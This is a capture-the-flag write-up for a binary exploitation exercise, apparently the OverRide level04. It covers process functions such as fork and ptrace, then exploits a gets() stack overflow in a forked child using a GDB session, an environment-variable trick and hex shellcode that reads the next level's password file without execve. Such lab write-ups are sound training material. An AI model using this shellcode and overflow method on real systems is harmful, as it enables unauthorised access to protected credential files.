[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
# Tools
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit
This exercice let's us explore the different threading mechanics.

# Explanations
We decompile the code using Dogbolt, and reverse engineer it.
There are many functions that ar enot so commonly used, so I recommend you just them using the man.
Still, I will give small brief about each of the important ones, in the order they are called:

## Functions
### `fork()`
```c
#include <unistd.h>

pid_t fork(void);
```
**Description**
Creates a new process, which starts at the point of execution where `fork()` has been called.
The newly created process (child process) is an exact copy of the calling process (the parent process) except:
- The child process has a unique process ID (PID), different from the parent's
- The child process has its copy of the parent's descriptors (see man)
- The child processes resource utilization are set to 0 (see man)
**Return values**
On success:
- Returns 0 to the child process, the PID of the child to the parent process
On failure:
- No child process is created, returns -1 and sets errno

### `wait()`
```c
#include <sys/wait.h>

pid_t wait(int *stat_loc);
```
**Description**
Susprends execution of its calling process until `stat_loc` information is available for a terminated chil process, or a signal is received,
On return from a successful `wait()` call, the `stat_loc` area contains termination information about the process that exited (see man)

Using different macros, we can get the information stored inside of `stat_loc` (see man)

### `ptrace()`
```c
#include <sys/types.h>
#include <sys/ptrace.h>

int ptrace(int request, pid_t pid, caddr_t addr, int data);
```
**Description**
Process tracing and debugging. Allows one process (the tracing process) to control another process (the traced process). Often, the traced process runs normally, but when it receives a signal, it stops. The tracing process is expected to notive this via `wait()` or the delivery of a SIGCHLD signal, examine the state of the stopped process, and cause it to terminate or continue as appropriate. All of that done through `ptrace()`.
**Arguments**
- `int request`: what operation is being performed (rest of the arguments will depend on it, except one case) (see Linux man)
	- `PTRACE_PEEKUSER`: read a word of data at iffset `addr` in the traced's USER area, that contains the register and other information about the process (see `<sys/user.h>`). The word is returned as the result of the `ptrace()` call. `data` is ignored.
	- `PTRACE_TRACEME`: Indicates that this process is being tracked by its parent. A process shouldn't do that if its parent isn't expecting to trace it (`pid`, `addr` and `data` are ignored).
	Only used by the traced process. The remaining operations are performed only by the tracing process. `pid` specifies the PID of the traced process. For operations other than `PTRACE_ATTACH`, `PTRACE_SIZE`, `PTRACE_INTERRUPT`, and `PTRACE_KILL`, the traced process must be stopped.
- `pid_t pid`: the PID of the traced process

### `kill()`
```c
#include <sys/types.h>
#include <signal.h>

int kill(pid_t pid, int sig);
```
**Description**
Send a signal to a process. Returns 0 on success. `pid` is to PID of the process to send the signal to, and `sig` the signal to send.

### `prctl()`
```c
#include <linux/prctl.h>
#include <sys/prctl.h>

int prctl(int op, ...);
```
**Description**
Used to manipulate various aspects of a thread or process. The first argument is the action, and the remainder or the arguments depends on that very first one.

At first, I thought that I would need to exploit some forking mechanism.
In fact, it's more about creating a shellcode that doesn't use `execve()`, as it's catched in the process and makes the process kill itself.

So, what do we traditionally do when we get a shellcode? We `cat /homes/levelxx/.pass`
What does cat do? It `open()`, `read()` and `write()`. No `execve()`.
So, we want to craft a payload that opens `/homes/level05/.pass`, reads its content and writes it to us on the standard output.

First, we want to make the program segfault. More precisely, it's the child that's going to segfault, not the entire program, since its the one making the `gets()` call.
To do that, we are going to make use of GDB, and tell it to track the child and not the parent process.

To trace the child process: `set follow-fork-mode child`
```
level04@OverRide:~$ gdb level04
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
(gdb) set follow-fork-mode child
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) b gets
Breakpoint 2 at 0x80484b0
(gdb) b *0x08048763
Breakpoint 3 at 0x8048763
```
We break at main, the `gets()` call and the address just after the `gets()` call (see `disass main`)
We ran the program, and fill `gets()` with:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ

Breakpoint 3, 0x08048763 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x49494949 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xf7fd08c4	-134412092
edx            0xffffd680	-10624
ebx            0x46464646	1179010630
esp            0xffffd720	0xffffd720
ebp            0x48484848	0x48484848
esi            0x0	0
edi            0x47474747	1195853639
eip            0x49494949	0x49494949
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```
As we can see, the program segfault'ed as it tried to go to address `0x49494949`. `49` is `I` in ASCII.
Thus, we need to write 157 characters and then write the address of our shellcode.

Second, we can get the address of the buffer by showing the content of the stack on the third breakpoint:
```
(gdb) x/80x $esp
0xffffd660:	0xffffd680	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd700:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd710:	0x46464646	0x47474747	0x48484848	0x49494949
0xffffd720:	0x4a4a4a4a	0xffffd700	0xffffd7bc	0xf7fd3000
```
`0xffffd680` is the address at which we start to write the data given by `gets()`.

Third, let's craft the payload, in ASM, then compile it and make a Python function to print it.
For the ASM shellcode, see `Resources/shellcode.s`, for the Python function, see `Resources/script.py`.

Because I work on Mac, I had to setup a quick Debian docker to compile the code.

We compile the shellcode:
```bash
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -o shellcode shellcode.o
```

Then, extract the shellcode from the binary:
```bash
objdump -d -M intel shellcode | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x35\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x89\xe3\xb1\x02\xb2\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x29\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x29\xcd\x80\xb0\x01\xcd\x80
```
Because it's super lenghty, we need to write it first inside of an environment variable, and then tell our program to look for the data in there.

Also, you need to make sure that the string of our shellcode doesn't contain any null bytes (`\x00`), or that would be a huge problem when copying strings.

Then, we craft an output, where we will fill the buffer and write the environment variable address, that you can get using a simple C code:
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	printf("%p\n", getenv("SHELLCODE"));
	return 0;
}
```
Using `env -i`, you can see where the shellcode will be stored in the environment:
```
level04@OverRide:~$ env -i SHELLCODE=$(python ~/pyshell.py) /tmp/main
0xffffdf8a
```
Also, make sure that the name of the executable, `/tmp/main`, is as long as the name of the executable you want to exploit: `./level04`.

Then, we write that address into the Python script to craft a malicious input, and we are good to go!

```
level04@OverRide:~$ cat input | env -i SHELLCODE=$(python ~/pyshell.py) ./level04
Give me some shellcode, k
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
child is exiting...
```
